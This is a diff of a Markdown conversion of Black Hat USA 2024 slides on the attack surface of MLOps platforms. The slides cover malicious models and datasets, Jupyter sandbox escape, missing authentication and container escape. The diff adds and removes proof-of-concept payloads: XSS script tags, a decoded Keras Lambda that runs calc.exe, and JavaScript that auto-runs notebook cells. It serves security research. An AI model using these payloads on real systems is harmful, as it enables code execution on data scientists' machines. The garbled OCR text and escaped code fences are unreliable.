@@ -8,18 +8,24 @@ year: 2024
 source_pdf: "Black Hat USA 2024 slides/Shachar Menashe_From MLOps to MLOops - Exposing the Attack Surface of Machine Learning Platforms.pdf"
 pages: 49
 sha256: "2869c1f88bacfc0e8ec9c25b755f79efe1cced50f8663e8e8f9eb447719d44b5"
-text_chars: 25466
-ocr_pages: 24
+text_chars: 20068
+ocr_pages: 21
 has_ocr: true
+redacted_secrets: 0
+ocr_confidence: 85.2
+ocr_unreliable_blocks: 0
+ocr_timeouts: 0
+pages_recovered_from_text_layer: 0
 companion_files: []
 extractor: "pymupdf4llm 1.28.2 + tesseract"
-converted_at: "2026-08-11T21:39:09Z"
+converted_at: "2026-08-12T04:42:16Z"
 ---
 # From MLOps to MLOops - Exposing the Attack Surface of Machine Learning Platforms
 
 **Speakers:** Shachar Menashe  
 **Conference:** Black Hat USA 2024  
 **Source:** `Black Hat USA 2024 slides/Shachar Menashe_From MLOps to MLOops - Exposing the Attack Surface of Machine Learning Platforms.pdf` (49 pages)
+
 
 ## Slide 1
 
@@ -29,11 +35,10 @@ Speaker: Shachar Menashe
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-blackhat' =. -
-USA 2024
 AUGUST 7-8, 2024
 From MLOps to MLOops
 Exposing the Attack Surface of Machine Leaming Platfonns
@@ -68,60 +73,28 @@ Shachar Menashe
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 53/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 blackhat
-USA 2024
 Org High Value Targets
 Experiments >
 Product Sales Demand © Provide Feedback (3 Add Description
-= + = Time created v State: Active + | Fisort:created » | [BGroupby » : oR
 Packages Choose Packages Options | ° fo) %t Group by
-~ Table Chart Evaluation Preview
-Discord a Chart ‘ion Previa
-° fun Name °
 Credentials © © abundant-snis
-Choose Targets © bivsnin \ Parameter Ranges (1)
-: WHISKEYT
-°
-®
-Hf Parallel Coordinates
 Use PDi
-Oy
-na max coo se
 ° © wise-
-© © sofl-sku |
 Push (use
-© ul ray-613
 os
-° © odie
-© © brant os
-° © bemused-stork
 o2
 ° busting
-‘
 Client’ ° vest
-° oe
-° © incongeu Y Optimization History (3) 7 ++ Add chart
-° _
-Horse Hf rmsevs. eta
-° merci omparng fist 100 rn ‘Comparing fst $00 run
-° © fun-mouse L 1
-Remem 0 © sosects oe
 © asteful a . o
-° os
-soo .
 Prioritiz © © cetficient-tr
-Windows XF “aw cold nett 0 sare.dentan al _ f o—____~@® © emersenres—
-) © minous-m 16:02:30 16:03:00 16:03:30 16:04:00 0 so0 1000 500 00
 san 23,2028
 ° © shivering-bo Time rmse
-° ' : 308 (rmse) weleoming-turle- 881 — adora ceptve-shark-101 — painted-hog-617
-ive stork 587 (emse) = srandiose-crab-864 — glamora marvelous-ly-146 — gfted-moth-379
-7) ==
 ®
-—
 ```
 
 ## Slide 4
@@ -169,11 +142,11 @@ _Deployment_
 
 ### What can MLOps do for YOU
 
-```
+\```
 @dsl.pipeline(
-```
+\```
 
-```
+\```
 name='XGBoostTrainer',
 )
 defxgb_train_pipeline(
@@ -184,23 +157,23 @@ eval_data='gs://ml-pipeline-playground/sfpd/eval.csv',
 ...
 ):
 ...
-```
+\```
 
-```
+\```
 _analyze_op= dataproc_analyze_op(
 ).after(_create_cluster_op).set_display_name('Analyzer')
 _transform_op= dataproc_transform_op(
 ).after(_analyze_op).set_display_name('Transformer')
 _train_op= dataproc_train_op(
-```
+\```
 
-```
+\```
 ).after(_transform_op).set_display_name('Trainer’)
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -214,21 +187,16 @@ CV_model 1.2
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 87/100 on the text kept, 73/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 What can MLOps do for YOU
 Model Registry
 My_ ‘dev. model 0.1
-ChatGPT 4.5 P
-Ge 8
-Model = 08: —
 ,; Data Scientists CV_ model 1.2 ML a
 & testing
 Production
-Discover K_Y
 & inspect
 ```
 
@@ -238,11 +206,10 @@ Discover K_Y
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 79/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 What can MLOps do for YOU
 Model Registry
 m [ C 210.0 Experiments Models @@ & GitHub Docs
@@ -250,7 +217,7 @@ Registered Models Create Model
 © Q
 Name =* Latest version Aliased versions Created by Last modified Tags
 iris_model_dev Version 17 2023-09-25 12:50:... —
-iris_model_prod Version 11 | @ champion § Version 11 | +3 2023-10-26 17:10:...  —
+iris_model_prod Version 11 | @ champion § Version 11 | +3 2023-10-26 17:10:... —
 iris_model_staging Version 11 2023-09-25 12:46:... —
 iris_model_testing Version 1 2023-09-27 13:17:... —
 mnist_model_dev Version 12 2023-09-25 12:39:.. —
@@ -268,20 +235,14 @@ Serving
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 What can MLOps do for YOU
 Model Serving
 input Smartphone
-Application /\OT
-Model presecnsnsncs a) ey
 training Model 3 l |
-a co buueweeeeueees ve, object 7 Embedding
-Prediction Sfop4 een
-hae
 Serving
 ```
 
@@ -291,9 +252,9 @@ What can MLOps do for YOU **Model Serving / Model as a Service / Inference Serve
 
 **`$ kubectl apply -f - << END`** `apiVersion: machinelearning.seldon.io/v1 kind: SeldonDeployment metadata: name: iris-model namespace: seldon` **Embedding** `spec: name: iris predictors: - graph: implementation: SKLEARN_SERVER` **`modelUri: gs://seldon-models/v1.19.0-dev/sklearn/iris` Serving** `name: classifier`
 
-```
+\```
 END
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -327,17 +288,14 @@ END
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Which frameworks were evaluated?
 mliflow % Kubeflow @&)MEIAFLOW
 TT, W&B & Cone
 | L
-zenin
-® Fork 408 - SY Star 3.8k -
 ```
 
 ## Slide 14
@@ -346,11 +304,10 @@ zenin
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 95/100 on the text kept, 94/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Inherent vs. Implementation Vulns
 AECVE-2020-22083 Detail
 Disputed
@@ -367,14 +324,14 @@ must not be used with un-trusted data
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Q >
 black hat
 USA 2024 :
 Inherent vs. Implementation Vulns
-ed.
 Warning: The pickle module is not secure. Only unpickle data you trust.
 It is possible to construct malicious pickle data which will execute arbitrary code during unpickling. Never
 unpickle data that could have come from an untrusted source, or that could have been tampered with.
@@ -391,11 +348,10 @@ Comparison with json.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 93/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Inherent vs. Implementation Vulns
 But ML is a new field...
 Software Update Unavailable
@@ -439,48 +395,12 @@ PMML
 
 ### Inherent – Malicious Models
 
-```
+\```
 fromkeras.modelsimportload_model
 m= load_model('vgg16_light/tf_model.h5')
-```
+\```
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-piseachat ;
-USA 2024
-Inherent — Malicious Models
-— HF_demo_files python lambda _detection.py vggi6 light/tf_model.h5
-Checking model vggi6 light/tf_model.h5S
-Found Lambda layer with name “output”
-With body function: B :
-Raw base64: A4wEAAAAAAAAAAAAAAAIAAAADAAAAQWAAAHMWAAAAZAFKAGWAFQF 8AaABZAKhAQEAFABTACKDTukA — HF_demo_files pycdc file.pyc
-AAAA+ghjYWxj LmV4ZSkC2gJvc90Gc31zdGVtKQLaAXhyAwAAAKkAcgYAAAD6VS90b211L2RhdmZy # Source Generated with Decompyle++
-LOpGUkK9HXOIpdGI1Y2t 1dC9haS1tb2R1bC1yZXN1YXJj aCQUZXNOcy9GYWt 1RGlyL 2NyZWFO@ZV9t Fae
-YWxpY21vdXNfVkdHMTYucHnaB2V4cGxvaXQDAAAAcwYAAAAAAQECCgE= # File: file.pyc (Python 3.10)
-Decoded bytes: b‘'\xe3\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00C\xOe :
-\x@1 | \x@1\xa@\x01d\x02\xa1\x01\x01\x00 | \x@@S\xO0) \xO3N\xe9\x00\x00\x00\x00\xfa\x@8calc.exe)\x02\xda\x020s] import os
-x0@0\xa9\x00r\x06\x00\x00\x00\xfaU/home/davfr/JFROG_Bitbucket/ai-model-research/Tests/FakeDir/create_malic os. system( ' calc exe ' »)
-00s \x06\x00\x00\x00\x00\x01\x08\x02\n\x01"
-return x
-Name: exploit
-Filename: /home/davfr/JFROG_Bitbucket/ai-model-research/Tests/FakeDir/create_malicious_VGG16.py
-Argument count: 1 —
-Positional-only arguments: @ | | estes
-Kw-only arguments: @ = Standard 3
-Number of locals: 2
-Stack size: 3
-Flags: OPTIMIZED, NEWLOCALS, NOFREE
-Constants:
-8: None
-1: 0
-Ae “opie from keras.models import load_model
-eo: 0s m = load model('vggi6 light/tf_model.h5')
-Variable names:
-Found 1 Lambda functions
-```
 
 ## Slide 19
 
@@ -496,33 +416,12 @@ Found 1 Lambda functions
 
 ### Inherent – Malicious Datasets
 
-```
+\```
 fromdatasets importload_dataset
 ds = load_dataset("hails/mmlu_no_train")
-```
+\```
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-blackhat | ;
-USA 2024 ,
-Inherent — Malicious Datasets
-® Datasets: ® hails/mmlu_no_train©G (Clike 9
-Tasks: Questiog@nswering Languages: English License: & mit
-~ . Hugging Face
-® Dgeset card ‘IE Files and versions ® Community
-Ae
-P main ~ mmlu_no_train
-from datasets import load dataset
-ds = load dataset("hails/mmlu_no_ train") @ halts @ devminn Conver —
-& all
-(i .gitattributes ©
-[4 README.md ©
-( data.tar ©
-(4 mmlu_no_train.py ©
-```
 
 ## Slide 21
 
@@ -530,17 +429,14 @@ ds = load dataset("hails/mmlu_no_ train") @ halts @ devminn Conver —
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 82/100 on the text kept, 75/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Eg
-blackhat : n
 USA 2024 | a
 Inherent — Malicious Datasets
-® Datasets: ® hails/mmlu_no_train©G (Clike 9
 Tasks: Question Answering Languages: English License:
 ® Dataset card ‘IE Files and versions ® Community
-P main ~ mmlu_no_train
 A dataset loading script should have the same name as a dataset repository or
 @ hails @ davzoku Convert da djrectory. For example, a repository named my_dataset should contain
 me all my_dataset.py script. This way it can be loaded with:
@@ -554,34 +450,12 @@ me all my_dataset.py script. This way it can be loaded with:
 
 ### Inherent – Malicious Datasets
 
-```
+\```
 fromdatasets importload_dataset
 ds = load_dataset("hails/mmlu_no_train")
-```
+\```
 
 #BHUSA @BlackHatEvents
-
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-blackhat
-USA 2024 27/7
-Inherent — Malicious Datasets
-from datasets import load dataset
-ds = ("hails/mmlu_no_train")
-€ datasets.load_dataset | @
-( path , Name , data_diz
-, date_files | split trust_remote_code (bool, defaults to True)|— Whether or not to allow for
-cache_dir , features 5 = - C C 5
-download_config , download_mode datasets defined on the Hub using a dataset script. This option should
-ignore verifications ene only be set to True for repositories you trust and in which you have read
-, s _inft , revig#on e .
-” token. union 2 None, use auth token fF the code, as it will execute code present on the Hub on your local
-: task . Stream fe machine.
-, num_proc __storas@ options
-, |/trust_remote_code
-*xconftig_kwargs ) + Dataset or DatasetDict
-```
 
 ## Slide 23
 
@@ -589,15 +463,14 @@ ignore verifications ene only be set to True for repositories you trust and in w
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 blackhat
-USA 2024
 Inherent — Jupyter Sandbox Escape
 Notebooks are invaluable for developing ML models
 : Jupyter Optical Coherence Tomography-Copy1 Last Checkpoint: Last Sunday at 6:14 PM (autosaved)
-File Edi Vie insert Cel Kemel N
 Contents 2% 1.3.3 Fourier Domain OCT (FDOCT)
 erence Tomography
 1.1 Imports, preliminari
@@ -607,34 +480,23 @@ In FDOCT, the different wavelengths are collected on a spectrometer, with Nx pix
 Returning again to Eq. (8) (see, e.g., Izatt and Choma (Izatt JA, Choma M.A. (2008) Theory of Optical Coherence Tomography. In: Drexler W., Fujimoto J.G.
 (eds) Optical Coherence Tomography. Biological and Medical Physics, Biomedical Engineering. Springer, Berlin, Heidelberg; doi: http: 07/978
 ¥ 1.3.1 Comments and calcula
-1.3.1. Resolution i) )_2: alternate link: https: ww researc et e_Tomograp! af nlo: ):
-7
-Ip(k = osu [« +y «| "DC terms" -
-1.9.2.1 Detection-bandwid =I co>
 TDOCT: SNR and N <p Y al arch Quora
 | +153 Fourier Domain OCT ( +2 say [3 /RaR, cos (2k(z — “| " Cross — correlation terms " a) (Q) Q Search Quora
 1.3.3.2 Int d Oo N
-1.3.3.3 Impact of finite nur +2500] LY VReRy cos [2k — 20] " Autocorrelation terms "
 1.3.3.4 FDOCT: SNR and 2 rime
 oe oe In the FDOCT configurati held fixed bd 5
 7 Ss T: SI in the configuration, zp is held fixe
 4 Staten guatn =n Why do so many machine learning tutorials use jupyter
-1.5 Potential laser sources In [23]:|  lambda_@ = 1.5500
+1.5 Potential laser sources In [23]:| lambda_@ = 1.5500
 k_@ = 2.0*np.pi/lambda_@ b k?
-ROO BEE notebook?
 Dk = 2.0*np.pi*Dlambda_@/lambda_e**2.0
 k_range = np.linspace(-3.@*Dk+k_@, +3.0"Dk+k_@, 10000) Ya, Answer >) Follow - 3 32 Request @) O Vv
 (k_range - k_@)/Dk)**2.0)) \
 '2.@E-4)*(np.exp(-((k_range - k_@)/Dk)**2.0)) \
-8)) \
-*(np.exp(-((kK1 k_0)/Dk)**2.0
 y*(np-exp(-((k_range - k 0) Das All related (32) V Sort | Recommended v
-_range* (200.2)
 TD_OCT_signal = (np .exp(-(
 In [26]: fig_disp
 — signal
-blar.
-Kum*-2]
 ```
 
 ## Slide 24
@@ -653,22 +515,17 @@ Kum*-2]
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Inherent — Jupyter Sandbox Escape
-#ejavascript
 function simulateMouseClick(element)
 var mouseClickEvents = [‘mousedown’, ‘click’, ‘mouseup'];
 mouseClickEvents.forEach(mouseEventType =>
-element .dispatchEvent(
 new MouseEvent(mouseEventType, view: window, bubbles: true, cancelable: true, buttons: 1 }) ) ya
-var buttons = Array. from(document. getElement sByClassName('jp-ToolbarButtonComponent' )) ;
 var run_btn = null;
 var plus_btn = null;
-buttons. forEach(b =>
 if (b.title == "Run this cell and advance (Shift+Enter)")
 run_btn = b;
 else if (b.title == "Insert a cell below (B)") 0
@@ -685,13 +542,10 @@ var html = ''; _—
 //add the code to the new cell 4 5 6
 code.split('\n').forEach(line =>
 html += ‘<div class="cm-line">' + line + ‘<br></div>'; 1 2 3 +
-)3
 inp.innerHTML = html;
 simulateMouseClick(inp) ; //focus on the cell's input box + (0)
 simulateMouseClick(run_btn) //run
 » "1000");
-mortorsoataccie)! Import os ; os.system("calc’)
-12)
 ```
 
 ## Slide 26
@@ -702,11 +556,10 @@ So - just don’t run untrusted code in Jupyter, right?
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Inherent — Jupyter Sandbox Escape
 Pmain recipe.yaml
 So - just don’t r
@@ -719,8 +572,6 @@ Variables must be dereferenced in a profile YAML file, located under ‘profiles
 # See ‘profiles/local.yaml* for example usage. One may switch among profiles quickly by
 # providing a profile name such as ‘local* in the Recipe object constructor:
 # “r = Recipe(profile="local") *
-OMNOAURWN
-Es
 #
 JECVE-2024-2713 10 # NOTE: ALL "FIXME::REQUIRED" fields in recipe.yaml and profiles/*.yaml must be set correctly
 ake # to adapt this template to a specific regression problem. To find all required fields,
@@ -751,12 +602,12 @@ Insufficient sanitization in 18 recipe: “regression/v1"
 
 Inherent – Jupyter Sandbox Escape **Shady Server**
 
-```
+\```
 recipe: "classification/v1"
 target_col: "<script>alert('pwned!');</script>"
 frommlflow.recipesimportRecipe
 recipe= Recipe(profile="local").run()
-```
+\```
 
 **Data Scientist**
 
@@ -768,11 +619,10 @@ recipe= Recipe(profile="local").run()
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 nt —- Jupyter Sandbox Escape
 . localhost:8888 says
 (
@@ -802,11 +652,11 @@ recipe = Recipe(profile="local"). runt)
 
 ### Implementation – Lack of authentication
 
-```
+\```
 @dsl.pipeline(
-```
+\```
 
-```
+\```
 name='XGBoostTrainer',
 )
 defxgb_train_pipeline(
@@ -817,12 +667,12 @@ eval_data='gs://ml-pipeline-playground/sfpd/eval.csv',
 ...
 ):
 ...
-```
+\```
 
-```
+\```
 _analyze_op= dataproc_analyze_op(
 ).after(_create_cluster_op).set_display_name('Analyzer')
-```
+\```
 
 **Pipeline AKA “Code execution as a feature”**
 
@@ -830,25 +680,25 @@ _analyze_op= dataproc_analyze_op(
 
 **What about authentication?**
 
-```
+\```
 _transform_op= dataproc_transform_op(
-```
+\```
 
-```
+\```
 ).after(_analyze_op).set_display_name('Transformer')
-```
+\```
 
-```
+\```
 _train_op= dataproc_train_op(
-```
+\```
 
-```
+\```
 ).after(_transform_op).set_display_name('Trainer’)
-```
+\```
 
-```
+\```
 ...
-```
+\```
 
 #BHUSA @BlackHatEvents
 
@@ -862,11 +712,10 @@ _train_op= dataproc_train_op(
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 78/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Implementation -— Lack of authentication
 Pipelines? Built-in Auth?
 d+ CORE J x
@@ -894,11 +743,10 @@ S) METAFLOW J x
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Implementation -— Lack of authentication
 = © oligo
 ShadowRay: First Known
@@ -936,17 +784,14 @@ Lateral movement in organization Access to other users’ resources
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-Q
 blackhat
-USA 2024
 Implementation -— Container escape
-ae
 Upload malicious model
 Predictor Service
-as IKCVE-2022-0185 Detail
 Description
 Queue Proxy A heap-based buffer overflow flaw was found in the way the legacy_parse_param function in the Filesystem Context functionality of the Linux
 kernel verified the supplied parameters length. An unprivileged (in case of unprivileged user namespaces enabled, otherwise needs
@@ -956,9 +801,7 @@ Model Server
 —_f + M etrics CVSS Version 4.0 CVSS Version 2.0
 NVD enrichment efforts reference publicly available information to associate vector strings. CVSS information contributed by other sources is also displayed.
 Storage Initializer CVSS 3.x Severity and Vector Strings:
-Vv.
 . — NIST: NVD B Ss H Vector: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
-Predictor Pod 1 \a ase Score: ector /AV:L/AC:L/PR:N/UL:N/S:U/C:H/I:H/
 ```
 
 ## Slide 37
@@ -983,11 +826,11 @@ Exfiltrate
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 86/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 black hat
-USA 2024 : /
 Implementation -— Container escape
 Al-as-a-Service attack flow
 70% of organizations are
@@ -999,17 +842,12 @@ a Legitimate customers run Al
 models on the service
 customer models
 . Attacker gains access to all fe xt aL
-Te Heh
 Org A/B/C... mo
 Shared Infrastructure .
 . Attacker performs lateral movement W S
 through the shared Al infrastructure Lis =]
-'
-:
 1. Attacker uploads malicious rd
 \i Al model . Attacker runs malicious Al <2
-model S Ivy)
-Attacker is r)
 WIZ Research
 ```
 
@@ -1053,11 +891,11 @@ Upload model
 
 ML Pipeline
 
-```
+\```
 fromtransformers importAutoTokenizer, AutoModelForCausalLM
 tokenizer= AutoTokenizer.from_pretrained("evildoer/badmodel")
 model= AutoModelForCausalLM.from_pretrained("evildoer/badmodel")
-```
+\```
 
 **Request latest ML model**
 
@@ -1118,27 +956,19 @@ Data Scientist
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 74/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2024
 Data scientists rejoice! Jupyter XSSGuard
 Untitled.ipynb x | +
 A+ Xk O O > @ C » Code v Python 3 (ipykernel) ©
-[8]: import io ial +? @
 import pandas as pd
-© =['''"<script>alert (document. cookie)</script>"
 a
-b rr
 c im Lo Elements Console Sources Network Performance Memory 2? ©@1A2 Ge fs} : x
-rT A tor @& Y Filter Default levels ¥ Bissues: MS | dhidden {3}
 s = io.StringI0O(
 _p. _ & Unsatisfied version 4.6.11 from @jupyterlab/application-top of shared singleton module consumes: 73
-table = pd.read . , : . . .
 = @jupyterlab/rendermime (required *4.2.2)
-table.style
-& Language pack "English_Israel" not valid! jlab core. 33f847ff2c.84/ffeca/ aller 1
 [8]: JupyterLab extension jupyterlab_output_iframe is activated!
 © * Uncaught DOMException: |Failed to read the ‘cookie' property from "Document": The
 Qa document is sandboxed and Tacks the “allow-Same-origin tleg.
@@ -1153,13 +983,12 @@ lb
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 88/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat |
 USA 2024 ,
 Hugging Face Datasets safe by default
-2.20.0 istest
 A albertvillanova released this 3 weeks ago —_- 31 commits to main since this release © 2.20.0 -O 98fdc9e &
 Important
 e Remove default trust_remote_code=True by @lhoestgq in #6954
@@ -1190,12 +1019,10 @@ e Remove default trust_remote_code=True by @lhoestgq in #6954
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 56/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-pifekhat (Ore i
-USA 2024
 Thank you! ©
-JFroz
 #BHUSA @BlackHatEvents
 ```
